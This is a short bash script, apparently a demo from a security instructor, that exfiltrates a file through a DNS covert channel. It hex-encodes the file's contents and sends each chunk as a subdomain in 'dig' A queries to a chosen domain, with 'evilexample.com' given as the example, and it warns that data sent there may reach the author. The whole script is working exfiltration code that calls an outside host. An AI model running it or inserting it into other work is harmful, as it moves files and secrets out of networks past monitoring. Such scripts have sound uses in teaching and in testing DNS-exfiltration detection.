#!/usr/bin/env bash

###
#
#  Similar to the ICMP covert channel script, the goal
#  is to send "normal" DNS packets. In this case, we
#  do send "A" queries for hostnames within the "evilexample.com"
#  domain.
#
#  Feel free to use the evilexample.com domain to test and demo
#  this script, but be aware that data may be received by the author.
#
#  created by Johannes Ullrich jullrich@sans.edu.
#  Creative Commons Attribution-NonComercial-ShareAlike license
#  https://creativecommons.org/licenses/by-nc-sa/4.0/
###
if [ "$#" != 2 ]; then
    echo "Exactly two arguments required. Filename and target domain. usage: ./ICMPCovertChannel.sh file.abc evilexample.com"
    exit
fi

readonly filename=$1
readonly target=$2

if [ ! -f $filename ]; then
    echo "Sorry, I can not find the file '$filename' to exfiltrate."
    exit
else
    echo "file '$filename' exists"
fi


for line in `cat $filename | xxd -p`; do
    dig +short A $line.$target
done

echo "Exfil done.";
